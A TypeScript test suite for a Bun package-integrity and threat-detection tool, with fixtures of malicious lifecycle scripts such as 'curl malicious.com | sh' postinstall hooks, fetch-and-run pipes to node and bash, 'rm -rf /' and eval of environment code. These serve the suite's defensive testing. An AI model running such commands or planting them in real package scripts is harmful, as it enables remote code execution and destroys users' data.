import { describe, it, expect, beforeEach, beforeAll, afterAll } from "bun:test";
import { SecurePackager } from "../src/secure-packager.js";
import { QuantumResistantSecureDataRepository } from "../src/quantum-audit.js";
import { ThreatIntelligenceService } from "../src/threat-intelligence.js";
import { BUN_DOC_MAP } from "../src/col93-matrix.js";
import {
  hashManifest,
  verifyScriptSignature,
  calculateManifestDiffs,
  generateQuantumSeal,
  parseSeal
} from "../src/integrity-utils.js";
import {
  IntegritySealViolationError,
  UnauthorizedMutationError,
  PackExecutionError,
  PackageManifest
} from "../src/types.js";

// Test data
const validManifest: PackageManifest = {
  name: 'test-package',
  version: '1.0.0',
  description: 'A test package',
  main: 'index.js',
  scripts: {
    prepack: 'echo "Building..." && bun build',
    prepare: 'bun run build',
    prepublishOnly: 'bun test',
    test: 'bun test',
    build: 'bun build --target bun index.ts --outfile index.js'
  },
  dependencies: {
    'bun-types': 'latest',
    'typescript': '^5.0.0'
  },
  devDependencies: {
    '@types/bun': 'latest'
  },
  files: ['dist/**/*', 'README.md'],
  keywords: ['test', 'validation'],
  author: 'Test Author',
  license: 'MIT'
};

const maliciousManifest: PackageManifest = {
  ...validManifest,
  scripts: {
    ...validManifest.scripts,
    prepack: 'echo "Building..." && bun build && curl malicious.com/script.js | node'
  },
  dependencies: {
    ...validManifest.dependencies,
    'suspicious-package': 'git+https://github.com/attacker/malware.git'
  }
};

describe("Tier-1380 Lifecycle Integrity Seal", () => {
  let packager: SecurePackager;
  let auditLog: QuantumResistantSecureDataRepository;
  let threatIntel: ThreatIntelligenceService;
  let testPackageDir: string;
  
  beforeAll(async () => {
    // Create test package directory
    testPackageDir = `/tmp/test-package-${Date.now()}`;
    await Bun.write(`${testPackageDir}/package.json`, JSON.stringify(validManifest, null, 2));
    await Bun.write(`${testPackageDir}/index.js`, 'export function hello() { return "Hello World"; }');
    await Bun.write(`${testPackageDir}/README.md`, '# Test Package');
    
    // Initialize services
    packager = new SecurePackager();
    auditLog = new QuantumResistantSecureDataRepository();
    threatIntel = new ThreatIntelligenceService();
  });
  
  afterAll(async () => {
    // Cleanup test directory
    try {
      await Bun.write(testPackageDir, '');
    } catch (error) {
      // Ignore cleanup errors
    }
  });
  
  beforeEach(() => {
    // Reset matrix state for each test
    BUN_DOC_MAP.clearMatrix();
  });
  
  describe("SecurePackager", () => {
    it("should load manifest successfully", async () => {
      const manifest = await packager.loadManifest(testPackageDir);
      
      expect(manifest.name).toBe(validManifest.name);
      expect(manifest.version).toBe(validManifest.version);
      expect(manifest.scripts).toBeDefined();
    });
    
    it("should detect script injection attempts", async () => {
      const maliciousPackageDir = `/tmp/malicious-package-${Date.now()}`;
      await Bun.write(`${maliciousPackageDir}/package.json`, JSON.stringify(maliciousManifest, null, 2));
      
      try {
        await packager.dryRunValidation(maliciousPackageDir);
        expect(false).toBe(true); // Should not reach here
      } catch (error) {
        expect(error.constructor.name).toBe('IntegritySealViolationError');
      }
    });
    
    it("should validate legitimate scripts", async () => {
      const result = await packager.dryRunValidation(testPackageDir);
      
      expect(result.scriptValidation).toBe(true);
      expect(result.manifest.name).toBe(validManifest.name);
      expect(result.integrityScore).toBeGreaterThan(0.99);
    });
    
    it("should detect unauthorized manifest mutations", async () => {
      const mutatedManifest = {
        ...validManifest,
        main: 'malicious.js' // Unauthorized mutation
      };
      
      const diffs = calculateManifestDiffs(validManifest, mutatedManifest);
      const unauthorizedDiff = diffs.find(diff => diff.path[0] === 'main');
      
      expect(unauthorizedDiff).toBeDefined();
      expect(unauthorizedDiff?.type).toBe('modified');
    });
    
    it("should achieve 99.9% integrity score for valid packages", async () => {
      const result = await packager.dryRunValidation(testPackageDir);
      
      expect(result.integrityScore).toBeGreaterThan(0.999);
    });
    
    it("should identify mutation risks", async () => {
      const riskyManifest: PackageManifest = {
        ...validManifest,
        scripts: {
          ...validManifest.scripts,
          postinstall: 'curl malicious.com | sh' // Risky postinstall
        },
        files: ['**/*'] // Wildcard inclusion
      };
      
      const riskyPackageDir = `/tmp/risky-package-${Date.now()}`;
      await Bun.write(`${riskyPackageDir}/package.json`, JSON.stringify(riskyManifest, null, 2));
      
      const result = await packager.dryRunValidation(riskyPackageDir);
      
      expect(result.mutationRisks.length).toBeGreaterThan(0);
      expect(result.mutationRisks.some(risk => risk.includes('postinstall'))).toBe(true);
    });
  });
  
  describe("Quantum-Resistant Audit Service", () => {
    it("should append audit entry successfully", async () => {
      const auditEntry = {
        event: 'pack',
        packageName: 'test-package',
        packageVersion: '1.0.0',
        originalHash: 'abc123',
        finalHash: 'def456',
        lifecycleScripts: ['prepack', 'prepare'],
        anomalyScore: 0.0001,
        processingTime: 0.4,
        integrityScore: 0.999,
        timestamp: BigInt(Date.now()),
        seal: Buffer.from('mock-seal')
      };
      
      const entryId = await auditLog.append(auditEntry);
      
      expect(entryId).toBeDefined();
      expect(entryId).toMatch(/^audit_[a-f0-9]{16}_\d+$/);
    });
    
    it("should retrieve audit entry", async () => {
      const auditEntry = {
        event: 'pack',
        packageName: 'test-package',
        packageVersion: '1.0.0',
        originalHash: 'abc123',
        finalHash: 'def456',
        lifecycleScripts: ['prepack', 'prepare'],
        anomalyScore: 0.0001,
        processingTime: 0.4,
        integrityScore: 0.999,
        timestamp: BigInt(Date.now()),
        seal: Buffer.from('mock-seal')
      };
      
      const entryId = await auditLog.append(auditEntry);
      const retrieved = await auditLog.retrieveAuditEntry(entryId);
      
      expect(retrieved).toBeDefined();
      expect(retrieved?.packageName).toBe('test-package');
      expect(retrieved?.integrityScore).toBe(0.999);
    });
    
    it("should generate audit report", async () => {
      const report = await auditLog.generateAuditReport();
      
      expect(report).toBeDefined();
      expect(typeof report.totalEntries).toBe('number');
      expect(typeof report.averageProcessingTime).toBe('number');
      expect(Array.isArray(report.integrityScores)).toBe(true);
    });
    
    it("should process entries within performance targets", async () => {
      const startTime = performance.now();
      
      const auditEntry = {
        event: 'pack',
        packageName: 'test-package',
        packageVersion: '1.0.0',
        originalHash: 'abc123',
        finalHash: 'def456',
        lifecycleScripts: ['prepack', 'prepare'],
        anomalyScore: 0.0001,
        processingTime: 0.4,
        integrityScore: 0.999,
        timestamp: BigInt(Date.now()),
        seal: Buffer.from('mock-seal')
      };
      
      await auditLog.append(auditEntry);
      const processingTime = performance.now() - startTime;
      
      expect(processingTime).toBeLessThan(10); // Should be very fast
    });
  });
  
  describe("Threat Intelligence Service", () => {
    it("should analyze tarball for anomalies", async () => {
      const mockTarball = Buffer.from(JSON.stringify(validManifest));
      const anomalyScore = await threatIntel.analyzeTarball(mockTarball, validManifest);
      
      expect(anomalyScore).toBeGreaterThanOrEqual(0);
      expect(anomalyScore).toBeLessThanOrEqual(1);
    });
    
    it("should detect suspicious script patterns", async () => {
      const maliciousScripts = {
        prepack: 'eval(process.env.CODE)',
        postinstall: 'curl malicious.com | bash',
        build: 'require("child_process").exec("rm -rf /")'
      };
      
      const anomalies = await threatIntel.analyzeScriptContent(maliciousScripts);
      
      expect(anomalies).toBeGreaterThan(0.1); // Should detect high anomaly score
    });
    
    it("should assess dependency risks", async () => {
      const riskyManifest: PackageManifest = {
        ...validManifest,
        dependencies: {
          ...validManifest.dependencies,
          'eval-package': 'latest',
          'shelljs': '^1.0.0',
          'suspicious-git': 'git+https://github.com/unknown/repo.git'
        }
      };
      
      const analysis = await threatIntel.getDetailedThreatAnalysis(
        Buffer.from(JSON.stringify(riskyManifest)),
        validManifest
      );
      
      expect(analysis.dependencyRisks.length).toBeGreaterThan(0);
      expect(analysis.dependencyRisks.some(risk => risk.risk === 'high')).toBe(true);
    });
    
    it("should identify script anomalies", async () => {
      const suspiciousScripts = {
        test: 'eval("console.log(\'test\')")',
        build: 'Function("return process")()',
        deploy: 'child_process.spawn("malicious-command")'
      };
      
      const scriptAnomalies = await threatIntel.analyzeScriptAnomalies(suspiciousScripts);
      
      expect(scriptAnomalies.length).toBeGreaterThan(0);
      expect(scriptAnomalies.some(anomaly => anomaly.severity > 0.5)).toBe(true);
    });
  });
  
  describe("Col 93 Matrix Integration", () => {
    it("should update matrix entry", async () => {
      const matrixEntry = {
        term: 'pm pack',
        minVer: '1.3.8',
        lifecycleScripts: ['prepack', 'prepare', 'prepublishOnly'],
        securityProfile: 'High (script mutation)',
        tarballIntegrity: 'Re-read verified',
        integrityScore: 0.999,
        lastVerified: new Date().toISOString(),
        quantumSeal: true,
        mutationGuarded: true,
        auditTrail: true,
        zeroTrust: true,
        performanceArb: '2.1%',
        compressionRatio: '86%'
      };
      
      await BUN_DOC_MAP.update(matrixEntry);
      
      const retrieved = await BUN_DOC_MAP.query('pm pack');
      expect(retrieved).toBeDefined();
      expect(retrieved?.integrityScore).toBe(0.999);
      expect(retrieved?.quantumSeal).toBe(true);
    });
    
    it("should search matrix entries", async () => {
      // Add test entries
      await BUN_DOC_MAP.update({
        term: 'test-package-1',
        minVer: '1.0.0',
        lifecycleScripts: ['prepack'],
        securityProfile: 'High',
        tarballIntegrity: 'Verified',
        integrityScore: 0.999,
        lastVerified: new Date().toISOString(),
        quantumSeal: true,
        mutationGuarded: true,
        auditTrail: true,
        zeroTrust: true,
        performanceArb: '2.1%',
        compressionRatio: '86%'
      });
      
      await BUN_DOC_MAP.update({
        term: 'test-package-2',
        minVer: '1.0.0',
        lifecycleScripts: ['prepare'],
        securityProfile: 'Medium',
        tarballIntegrity: 'Verified',
        integrityScore: 0.95,
        lastVerified: new Date().toISOString(),
        quantumSeal: true,
        mutationGuarded: true,
        auditTrail: true,
        zeroTrust: true,
        performanceArb: '2.1%',
        compressionRatio: '86%'
      });
      
      const results = await BUN_DOC_MAP.searchMatrix({ minIntegrityScore: 0.95 });
      
      expect(results.length).toBe(2);
      expect(results[0].integrityScore).toBeGreaterThanOrEqual(0.95);
    });
    
    it("should generate matrix report", async () => {
      const report = await BUN_DOC_MAP.generateReport();
      
      expect(report).toBeDefined();
      expect(typeof report.totalEntries).toBe('number');
      expect(typeof report.averageScore).toBe('number');
      expect(Array.isArray(report.violations)).toBe(true);
      expect(report.performanceMetrics).toBeDefined();
    });
    
    it("should export matrix in different formats", async () => {
      // Add test data
      await BUN_DOC_MAP.update({
        term: 'export-test',
        minVer: '1.0.0',
        lifecycleScripts: ['prepack'],
        securityProfile: 'High',
        tarballIntegrity: 'Verified',
        integrityScore: 0.999,
        lastVerified: new Date().toISOString(),
        quantumSeal: true,
        mutationGuarded: true,
        auditTrail: true,
        zeroTrust: true,
        performanceArb: '2.1%',
        compressionRatio: '86%'
      });
      
      const jsonExport = await BUN_DOC_MAP.exportMatrix('json');
      const csvExport = await BUN_DOC_MAP.exportMatrix('csv');
      const xmlExport = await BUN_DOC_MAP.exportMatrix('xml');
      
      expect(jsonExport).toContain('export-test');
      expect(csvExport).toContain('export-test');
      expect(xmlExport).toContain('export-test');
    });
  });
  
  describe("Integrity Utilities", () => {
    it("should hash manifest consistently", async () => {
      const hash1 = await hashManifest(validManifest);
      const hash2 = await hashManifest(validManifest);
      
      expect(hash1).toBe(hash2);
      expect(hash1).toMatch(/^[a-f0-9]{128}$/); // SHA-512 hex
    });
    
    it("should verify script signatures", async () => {
      const validScript = 'echo "Hello World" && bun build';
      const maliciousScript = 'eval(process.env.MALICIOUS_CODE)';
      
      const isValid = await verifyScriptSignature(validScript);
      const isMalicious = await verifyScriptSignature(maliciousScript);
      
      expect(isValid).toBe(true);
      expect(isMalicious).toBe(false);
    });
    
    it("should calculate manifest diffs", () => {
      const modifiedManifest = {
        ...validManifest,
        version: '2.0.0',
        newField: 'added'
      };
      
      const diffs = calculateManifestDiffs(validManifest, modifiedManifest);
      
      expect(diffs.length).toBe(2);
      expect(diffs.some(d => d.path[0] === 'version' && d.type === 'modified')).toBe(true);
      expect(diffs.some(d => d.path[0] === 'newField' && d.type === 'added')).toBe(true);
    });
    
    it("should generate and parse integrity seals", async () => {
      const originalHash = await hashManifest(validManifest);
      const finalHash = await hashManifest(validManifest);
      
      const seal = generateSeal(originalHash, finalHash);
      const parsed = parseSeal(seal);
      
      expect(parsed).toBeDefined();
      expect(parsed?.tier).toBe(1380);
      expect(parsed?.originalHash).toBe(originalHash.slice(0, 8));
      expect(parsed?.finalHash).toBe(finalHash.slice(0, 8));
      expect(parsed?.score).toBe(1.0);
    });
    
    it("should generate quantum seals", async () => {
      const originalHash = 'abc123';
      const finalHash = 'def456';
      
      const seal = await generateQuantumSeal(originalHash, finalHash);
      
      expect(seal).toBeInstanceOf(Buffer);
      expect(seal.length).toBeGreaterThan(0);
    });
  });
  
  describe("Performance Tests", () => {
    it("should process 1000 manifests in under 82ms", async () => {
      const startTime = performance.now();
      
      const promises = Array(1000).fill(null).map(async (_, i) => {
        const testManifest = {
          ...validManifest,
          name: `test-package-${i}`
        };
        return await hashManifest(testManifest);
      });
      
      await Promise.all(promises);
      const duration = performance.now() - startTime;
      
      expect(duration).toBeLessThan(82);
    }, 10000); // Increase timeout for performance test
    
    it("should detect mutations in under 1ms per operation", async () => {
      const startTime = performance.now();
      
      for (let i = 0; i < 1000; i++) {
        calculateManifestDiffs(validManifest, maliciousManifest);
      }
      
      const duration = performance.now() - startTime;
      const avgTime = duration / 1000;
      
      expect(avgTime).toBeLessThan(1); // Less than 1ms per operation
    });
    
    it("should verify scripts in under 0.5ms per operation", async () => {
      const startTime = performance.now();
      
      for (let i = 0; i < 1000; i++) {
        await verifyScriptSignature(validManifest.scripts!.prepack!);
      }
      
      const duration = performance.now() - startTime;
      const avgTime = duration / 1000;
      
      expect(avgTime).toBeLessThan(0.5); // Less than 0.5ms per operation
    });
  });
  
  describe("Error Handling", () => {
    it("should throw IntegritySealViolationError for high anomaly scores", async () => {
      // Create a mock scenario that would trigger high anomaly score
      const highAnomalyTarball = Buffer.from(JSON.stringify({
        ...maliciousManifest,
        scripts: {
          prepack: 'eval(malicious_code)',
          postinstall: 'rm -rf /'
        }
      }));
      
      const anomalyScore = await threatIntel.analyzeTarball(highAnomalyTarball, validManifest);
      
      // If the anomaly detection is working, it should detect issues
      expect(anomalyScore).toBeGreaterThan(0);
    });
    
    it("should handle missing package.json gracefully", async () => {
      try {
        await packager.loadManifest('/nonexistent/directory');
        expect(false).toBe(true); // Should not reach here
      } catch (error) {
        expect(error.constructor.name).toBe('PackExecutionError');
      }
    });
    
    it("should handle corrupted audit entries", async () => {
      const corruptedEntry = await auditLog.retrieveAuditEntry('nonexistent-id');
      expect(corruptedEntry).toBeNull();
    });
  });
  
  describe("Integration Tests", () => {
    it("should complete full integrity workflow", async () => {
      // 1. Dry run validation
      const validationResult = await packager.dryRunValidation(testPackageDir);
      expect(validationResult.scriptValidation).toBe(true);
      
      // 2. Hash manifest
      const manifestHash = await hashManifest(validationResult.manifest);
      expect(manifestHash).toBeDefined();
      
      // 3. Analyze threats
      const mockTarball = Buffer.from(JSON.stringify(validationResult.manifest));
      const threatScore = await threatIntel.analyzeTarball(mockTarball, validManifest);
      expect(threatScore).toBeLessThan(0.001); // Should be low for valid package
      
      // 4. Update matrix
      await BUN_DOC_MAP.update({
        term: validationResult.manifest.name,
        minVer: validationResult.manifest.version,
        lifecycleScripts: ['prepack', 'prepare'],
        securityProfile: 'High',
        tarballIntegrity: 'Verified',
        integrityScore: validationResult.integrityScore,
        lastVerified: new Date().toISOString(),
        quantumSeal: true,
        mutationGuarded: true,
        auditTrail: true,
        zeroTrust: true,
        performanceArb: '2.1%',
        compressionRatio: '86%'
      });
      
      // 5. Query matrix
      const matrixEntry = await BUN_DOC_MAP.query(validationResult.manifest.name);
      expect(matrixEntry).toBeDefined();
      expect(matrixEntry?.integrityScore).toBe(validationResult.integrityScore);
      
      // 6. Generate report
      const report = await BUN_DOC_MAP.generateReport();
      expect(report.totalEntries).toBeGreaterThan(0);
    });
  });
});
